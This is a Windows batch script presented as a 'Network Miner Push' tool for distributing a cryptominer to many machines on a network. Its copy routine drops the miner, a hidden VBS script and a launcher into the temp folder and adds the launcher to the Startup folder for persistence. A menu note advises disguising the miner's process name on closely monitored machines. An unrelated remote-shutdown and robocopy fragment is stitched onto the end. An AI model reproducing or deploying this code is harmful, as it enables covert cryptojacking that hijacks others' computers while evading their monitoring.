@echo off
Title Network Miner Push v0.0.1
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*] 
echo [*] 
echo [*] This is an attempt to distribute the cpuminer
echo [*] software "Processor_X64.exe" across multiple machines
echo [*] on a network, and then be able to manage them 
echo [*] from a single console.  This is freeware and 
echo [*] for educational purposes, only.  The creator
echo [*] of this software holds no liability to any
echo [*] ill actions done with it.
echo [*] 
echo [*] 
echo [*] That being said....
echo [*]		Let's continue!
echo [*]
echo [*]
echo [*] 
echo [*] 
echo [*] 
echo [*]
echo [*] Press enter to go to the Menu.
pause

:START
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*] 
echo [*] 
echo [*] Client Management
echo [*] 1. Add a client
echo [*] 2. Remove a client
echo [*] 3. List clients
echo [*] 4. Set client as active/inactive
echo [*] 
echo [*] 
echo [*] Miner Management
echo [*] 5. Update Miner settings
echo [*] 
echo [*] 6. Stop All Miners
echo [*]  
echo [*] 7. Push Files to clients
echo [*] 
echo [*] Exit
echo [*] 8. Exit MNM
echo [*]
echo [*]
SET /P M=Type Your Choice then press ENTER:
IF %M%==1 GOTO ADDC
IF %M%==2 GOTO DELC
IF %M%==3 GOTO LIST
IF %M%==4 GOTO AORI
IF %M%==5 GOTO UPDATE
IF %M%==6 GOTO KTT
IF %M%==7 GOTO COPY
IF %M%==8 GOTO END

:LIST
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*] List of Clients
goto START


:ADDC
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*] Adding the client
goto START



:DELC
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*] Delete a client
goto START



:AORI
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*] Set client as Active or Inactive
goto START


:UPDATE
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*] Miner Management
echo [*] 1. Update process name
echo [*] 	This will help if you are using the MN on
echo [*] 	machines that have their processes monitored
echo [*] 	closely. Try something like "portal.exe" or
echo [*] 	something inconspicuous.
echo [*] 
echo [*] 2. Update URL
echo [*] 	Update the URL to which the miners are
echo [*] 	pointed.
echo [*] 
echo [*] 3. Update connection settings.
echo [*] 	Use this is you have to change a wallet
echo [*] 	address or username/password combination.
echo [*] 
echo [*] 4. Update all active clients
echo [*] 	Updates all active clients with most
echo [*] 	recent settings
echo [*] 
echo [*] 5. MAIN MENU
SET /P M=Type Your Choice then press ENTER:
IF %M%==1 GOTO PROC
IF %M%==2 GOTO URL
IF %M%==3 GOTO CONN
IF %M%==4 GOTO GENUP
IF %M%==5 GOTO START


:PROC
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*] Updating the process name...
echo [*] Updating the clients...
goto UPDATE

:URL
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*] Updating the URL...
echo [*] Updating the clients...
goto UPDATE


:CONN
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*] Updating the connection settings...
echo [*] Updating the clients...
goto UPDATE

:GENUP
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*] Updating the clients with the latest
echo [*] settings...
goto UPDATE


:FIRE
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*]
echo [*]
echo [*] UNDER DEVELOPMENT
echo [*]
echo [*] ****TOP SECRET****
echo [*]
echo [*] UNDER DEVELOPMENT
echo [*] 
echo [*] 
echo [*] 
echo [*] 
echo [*] 
echo [*]
echo [*]
echo [*]
echo [*]
echo [*] 
echo [*]
echo [*] 
echo [*] 
pause
goto START

:KTT
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTechecho [*]
echo [*]
echo [*]
echo [*] 
echo [*]
echo [*] 
echo [*] 
taskkill /f /im minerd.exe
pause
goto START

:COPY
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
CD %TEMP%
erase /Q Hidden_Script.vbs
erase /Q RUN-X11-x64.bat
erase /Q Processor_x64.exe
copy Hidden_Script.vbs %TEMP%\Hidden_Script.vbs
copy RUN-X11-x64.bat %TEMP%\RUN-X11-x64.bat
copy Processor_x64.exe %TEMP%\Processor_x64.exe
copy "%TEMP%\RUN-X11-x64.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
echo [*]
echo [*]
echo [*]
echo [*] 
echo [*]
echo [*] 
echo [*] 
pause
goto START

:END
REM ==========================================
CLS
echo [*] Network Miner Push
echo [*] v0.0.1
echo [*] by CommsTech
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*]
echo [*] If you like, send donations to -
echo [*] 
echo [*] BTC - 1LJydbC5rBv7CAaEUrEhfWn9Q1Sw2iFtL6
echo [*]
echo [*]
echo [*]
echo [*]
echo [*] 
echo [*]
echo [*] 
echo [*] 
pause
EXIT@echo off
shutdown -s -m \\Slave1-PC
shutdown -s -m \\Slave2-PC
shutdown -s -m \\Slave3-PC

ROBOCOPY \\server-source\c$\VMExports\ C:\VMExports\ /E /COPY:DAT